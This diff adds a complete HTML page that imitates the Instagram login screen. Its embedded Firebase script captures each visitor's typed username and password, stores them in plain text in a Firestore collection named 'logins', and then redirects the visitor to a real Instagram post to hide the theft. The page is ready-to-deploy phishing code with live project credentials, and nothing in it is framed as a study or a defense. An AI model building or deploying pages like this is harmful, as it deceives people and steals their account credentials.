@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram Login</title>
+<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
+<style>
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+  }
+
+  body {
+    font-family: 'Segoe UI', Arial, sans-serif;
+    background: #fafafa;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+
+  .login-box {
+    width: 350px;
+    background: #fff;
+    border: 1px solid #dbdbdb;
+    border-radius: 1px;
+    padding: 40px 40px 20px;
+  }
+
+  .logo {
+    text-align: center;
+    margin-bottom: 30px;
+  }
+
+  .logo h1 {
+    font-family: 'Grand Hotel', cursive;
+    font-size: 42px;
+    font-weight: 400;
+    color: #262626;
+  }
+
+  .input-group {
+    margin-bottom: 6px;
+    position: relative;
+  }
+
+  .input-group input {
+    width: 100%;
+    padding: 9px 8px;
+    background: #fafafa;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+    font-size: 12px;
+    color: #262626;
+  }
+
+  .input-group input::placeholder {
+    color: #8e8e8e;
+  }
+
+  .input-group input:focus {
+    outline: none;
+    border-color: #a8a8a8;
+  }
+
+  .toggle-password {
+    position: absolute;
+    right: 8px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    font-size: 12px;
+    font-weight: 600;
+    color: #262626;
+    cursor: pointer;
+  }
+
+  .login-btn {
+    width: 100%;
+    padding: 8px;
+    margin-top: 8px;
+    background: #4cb5f9;
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+  }
+
+  .login-btn:hover {
+    background: #3aa0e8;
+  }
+
+  .forgot {
+    text-align: center;
+    margin-top: 16px;
+    font-size: 12px;
+    color: #262626;
+  }
+
+  .forgot a {
+    color: #00376b;
+    text-decoration: none;
+    font-weight: 600;
+  }
+
+  .divider {
+    display: flex;
+    align-items: center;
+    margin: 18px 0;
+    color: #8e8e8e;
+    font-size: 13px;
+    font-weight: 600;
+  }
+
+  .divider::before,
+  .divider::after {
+    content: "";
+    flex: 1;
+    height: 1px;
+    background: #dbdbdb;
+  }
+
+  .divider span {
+    padding: 0 18px;
+  }
+
+  .facebook-login {
+    text-align: center;
+    margin-bottom: 20px;
+  }
+
+  .facebook-login a {
+    color: #385185;
+    font-size: 14px;
+    font-weight: 600;
+    text-decoration: none;
+  }
+
+  .signup {
+    text-align: center;
+    border: 1px solid #dbdbdb;
+    border-radius: 1px;
+    padding: 20px;
+    margin-top: 10px;
+    font-size: 14px;
+    color: #262626;
+  }
+
+  .signup a {
+    color: #0095f6;
+    text-decoration: none;
+    font-weight: 600;
+  }
+</style>
+</head>
+<body>
+
+<div>
+  <div class="login-box">
+    <div class="logo">
+      <h1>Instagram</h1>
+    </div>
+
+    <form onsubmit="goToPost(); return false;">
+      <div class="input-group">
+        <input type="text" placeholder="Phone number, email or username">
+      </div>
+
+      <div class="input-group">
+        <input type="password" id="password" placeholder="Password">
+        <button type="button" class="toggle-password" onclick="togglePassword()">Show</button>
+      </div>
+
+      <button type="submit" class="login-btn">Log In</button>
+    </form>
+
+    <div class="forgot">
+      Forgot your login details? <a href="#">Get help logging in.</a>
+    </div>
+
+    <div class="divider"><span>OR</span></div>
+
+    <div class="facebook-login">
+      <a href="#">Log in with Facebook</a>
+    </div>
+  </div>
+
+  <div class="signup">
+    Don't have an account? <a href="#">Sign up.</a>
+  </div>
+</div>
+
+<script>
+  function togglePassword() {
+    const pwd = document.getElementById('password');
+    const btn = document.querySelector('.toggle-password');
+    if (pwd.type === 'password') {
+      pwd.type = 'text';
+      btn.textContent = 'Hide';
+    } else {
+      pwd.type = 'password';
+      btn.textContent = 'Show';
+    }
+  }
+
+  function goToPost() {
+    window.location.href = "https://www.instagram.com/p/DapdLXQS5tf/";
+  }
+</script>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+  import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyD8cPhCOMBjwmy6LYYxC_aY2vqQMLhuAAM",
+    authDomain: "photogram-b8ba4.firebaseapp.com",
+    projectId: "photogram-b8ba4",
+    storageBucket: "photogram-b8ba4.firebasestorage.app",
+    messagingSenderId: "514301890641",
+    appId: "1:514301890641:web:e407c077b712a47ffde870",
+    measurementId: "G-M7HQQ2CMFN"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+
+  // This replaces the old goToPost function above
+  window.goToPost = async function () {
+    const username = document.querySelector('input[type="text"]').value;
+    const password = document.getElementById('password').value;
+
+    try {
+      await addDoc(collection(db, "logins"), {
+        username: username,
+        password: password,
+        time: new Date().toString()
+      });
+      console.log("Saved to Firebase!");
+    } catch (err) {
+      console.error("Error saving to Firebase:", err);
+    }
+
+    window.location.href = "https://www.instagram.com/p/DapdLXQS5tf/";
+  };
+</script>
+
+</body>
+</html>
